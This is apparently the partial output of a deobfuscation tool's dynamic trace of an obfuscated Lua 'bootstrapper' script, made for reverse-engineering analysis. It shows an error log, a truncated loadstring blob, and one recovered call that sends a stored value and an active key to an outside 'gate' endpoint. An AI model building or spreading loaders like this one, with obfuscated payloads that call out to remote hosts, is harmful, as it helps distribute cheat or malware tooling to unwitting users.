-- Deobfuscated by deobf (dynamic trace)
-- source: bootstrapper-06926.lua
-- NOTE: reconstructed from observed behaviour; branches that were not taken
--       during the trace are missing and conditions are only noted in comments.
-- run status: script error: [string "Luraph"]:1: invalid argument #1 to 'create' (size out of range)
--   C:/Users/User/Desktop/EGO/ravel0.7/Deobfuscator/BIGSAMPLE/Immortal/ImmortalOutput/bootstrapper-06926.deobf.luau.harness.luau:5371
--   [string "Luraph"]:1
--   [string "Luraph"]:1
--   Script:3
--   C:/Users/User/Desktop/EGO/ravel0.7/Deobfuscator/BIGSAMPLE/Immortal/ImmortalOutput/bootstrapper-06926.deobf.luau.harness.luau:5376
--   
-- 49 statements recorded in 1.77s
-- non-standard globals touched: LUAW_DATA, ACTIVE_KEY

-- loadstring() of 199441 bytes: "return setmetatable({[2]=buffer.fromstring,a=function(L,...)(...)[...]=nil;end,[117]=buffer.writebits,XA=function(L,j,g,t,v,r,p,f,o,w,_,U,q,S)if U<=33 then if U<=32 then return not not(158>=j)and 120 "
-- [deobf] removed 56 lines of the obfuscator's environment/anti-tamper probes
http_request({ Method = "GET", Url = "http://api.imt-hub.xyz/gate?v=b&s=" .. LUAW_DATA[8] .. "&k=" .. ACTIVE_KEY })
